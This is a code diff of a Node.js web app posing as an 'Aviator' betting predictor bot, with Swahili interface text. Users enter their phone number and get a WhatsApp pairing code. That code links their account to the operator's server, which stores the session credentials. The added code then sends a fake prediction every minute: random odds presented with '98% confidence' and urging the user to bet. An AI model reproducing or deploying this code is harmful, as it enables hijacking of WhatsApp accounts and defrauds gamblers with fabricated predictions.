@@ -13,59 +13,41 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Aviator Predator UI
 app.get('/', (req, res) => {
     res.send(`
         <!DOCTYPE html>
-        <html lang="sw">
+        <html>
         <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Aviator Predator Pairing</title>
+            <title>AVIATOR PREDATOR BOT</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1">
             <style>
-                body { font-family: 'Arial', sans-serif; background: #000000; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-                .card { background: #1a1a1a; padding: 30px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; border: 2px solid #ff0000; box-shadow: 0 0 20px rgba(255, 0, 0, 0.3); }
-                h2 { color: #ff0000; text-transform: uppercase; letter-spacing: 2px; }
-                input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #444; background: #2a2a2a; color: #fff; font-size: 16px; text-align: center; outline: none; }
-                button { width: 100%; padding: 12px; background: #ff0000; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
-                button:hover { background: #cc0000; transform: scale(1.02); }
-                #code { font-size: 35px; color: #ff0000; margin: 20px 0; font-weight: bold; letter-spacing: 5px; text-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
-                .footer { font-size: 12px; color: #888; margin-top: 15px; }
+                body { font-family: 'Courier New', monospace; background: #000; color: #0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+                .card { background: #111; padding: 30px; border-radius: 10px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #ff0000; box-shadow: 0 0 15px #ff0000; }
+                h2 { color: #ff0000; text-shadow: 2px 2px #500; }
+                input { width: 100%; padding: 12px; margin: 15px 0; background: #222; color: #ff0000; border: 1px solid #ff0000; border-radius: 5px; font-weight: bold; }
+                button { width: 100%; padding: 12px; background: #ff0000; color: #000; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+                #code { font-size: 30px; margin: 20px 0; letter-spacing: 5px; color: #fff; }
+                .status { font-size: 12px; color: #888; }
             </style>
         </head>
         <body>
             <div class="card">
-                <h2>Aviator Predator 🚀</h2>
-                <p class="footer">Weka namba yako kuanza na code ya nchi</p>
-                <input type="text" id="phone" placeholder="2557XXXXXXXX">
-                <button onclick="getPairingCode()" id="submitBtn">GET PAIRING CODE</button>
+                <h2>AVIATOR PREDICTOR v3.0</h2>
+                <p class="status">SYSTEM STATUS: READY TO HACK...</p>
+                <input type="text" id="num" placeholder="255XXXXXXXXX">
+                <button onclick="getPair()">ACTIVATE BOT</button>
                 <div id="code"></div>
-                <p id="status" class="footer"></p>
+                <p id="msg" class="status"></p>
             </div>
             <script>
-                async function getPairingCode() {
-                    const num = document.getElementById('phone').value.replace(/[^0-9]/g, '');
-                    if(num.length < 10) return alert('Ingiza namba sahihi ya simu!');
-                    
-                    const btn = document.getElementById('submitBtn');
-                    btn.disabled = true;
-                    btn.innerText = "GENERATING...";
-                    document.getElementById('status').innerText = "Connecting to Aviator Servers...";
-
-                    try {
-                        const res = await fetch('/get-code?num=' + num);
-                        const data = await res.json();
-                        if(data.code) {
-                            document.getElementById('code').innerText = data.code;
-                            document.getElementById('status').innerText = "Nenda WhatsApp > Linked Devices > Link with Phone Number uweke kodi hiyo.";
-                        } else {
-                            document.getElementById('status').innerText = "Kosa limetokea. Jaribu tena.";
-                        }
-                    } catch(e) {
-                        document.getElementById('status').innerText = "Server Error. Check your connection.";
-                    }
-                    btn.disabled = false;
-                    btn.innerText = "GET PAIRING CODE";
+                async function getPair() {
+                    const n = document.getElementById('num').value.replace(/[^0-9]/g, '');
+                    if(!n) return alert('Ingiza namba!');
+                    document.getElementById('msg').innerText = "Inatengeneza muunganiko...";
+                    const r = await fetch('/get-code?num=' + n);
+                    const d = await r.json();
+                    document.getElementById('code').innerText = d.code || "RETRY";
+                    document.getElementById('msg').innerText = "Weka kodi hii kwenye WhatsApp kisha subiri utabiri DM.";
                 }
             </script>
         </body>
@@ -73,51 +55,48 @@ app.get('/', (req, res) => {
     `);
 });
 
-// Pairing Logic
 app.get('/get-code', async (req, res) => {
     let num = req.query.num;
-    const sessionPath = path.join('/tmp', 'aviator-' + num);
-    if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
-
+    const sessionPath = path.join('/tmp', 'predator-' + num);
     const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
 
-    try {
-        const sock = makeWASocket({
-            auth: {
-                creds: state.creds,
-                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
-            },
-            printQRInTerminal: false,
-            logger: pino({ level: "fatal" }),
-            browser: ["Aviator Predator", "Chrome", "114.0.5735.199"]
-        });
+    const sock = makeWASocket({
+        auth: {
+            creds: state.creds,
+            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
+        },
+        printQRInTerminal: false,
+        logger: pino({ level: "fatal" }),
+        browser: ["Aviator-Predator", "MacOS", "10.15.7"]
+    });
 
-        sock.ev.on('creds.update', saveCreds);
+    sock.ev.on('creds.update', saveCreds);
 
-        sock.ev.on('connection.update', async (update) => {
-            const { connection } = update;
-            if (connection === 'open') {
-                await delay(5000);
-                const credsData = JSON.parse(fs.readFileSync(path.join(sessionPath, 'creds.json')));
-                const sessionID = Buffer.from(JSON.stringify(credsData)).toString('base64');
+    sock.ev.on('connection.update', async (update) => {
+        const { connection } = update;
+        if (connection === 'open') {
+            const sessionID = Buffer.from(JSON.stringify(state.creds)).toString('base64');
+            
+            // 1. Tuma Session ID kwanza
+            await sock.sendMessage(sock.user.id, { text: "*BOT ACTIVATED! ✅*\n\nSession ID: " + sessionID });
+
+            // 2. Anza kutuma "Predictor Results" (Simulation)
+            setInterval(async () => {
+                const odds = (Math.random() * (5.5 - 1.2) + 1.2).toFixed(2); // Inazalisha odds kati ya 1.20 na 5.50
+                const time = new Date().toLocaleTimeString();
                 
-                // Tuma Session ID kwa mtumiaji
                 await sock.sendMessage(sock.user.id, { 
-                    text: `*🚀 AVIATOR PREDATOR CONNECTED! ✅*\n\n*Hii ndio Session ID yako:*\n\n\`\`\`${sessionID}\`\`\`\n\n_Tumia kodi hii kuanzisha Predator Bot yako sasa!_` 
+                    text: `*🚀 AVIATOR PREDICTION*\n\n*Next Round:* ${odds}x\n*Confidence:* 98%\n*Time:* ${time}\n\n_Weka bet yako sasa!_` 
                 });
-                console.log(`Aviator Predator session active for: ${num}`);
-            }
-        });
-
-        if (!sock.authState.creds.registered) {
-            await delay(2500);
-            let code = await sock.requestPairingCode(num);
-            if (!res.headersSent) res.json({ code });
+            }, 60000); // Inatuma kila baada ya dakika 1 (sekunde 60,000)
         }
+    });
 
-    } catch (err) {
-        if (!res.headersSent) res.json({ error: "Failed" });
+    if (!sock.authState.creds.registered) {
+        await delay(2000);
+        let code = await sock.requestPairingCode(num);
+        res.json({ code });
     }
 });
 
-app.listen(PORT, () => console.log(`Aviator Predator running on port ${PORT}`));
+app.listen(PORT, () => console.log(`Aviator Predator Active!`));
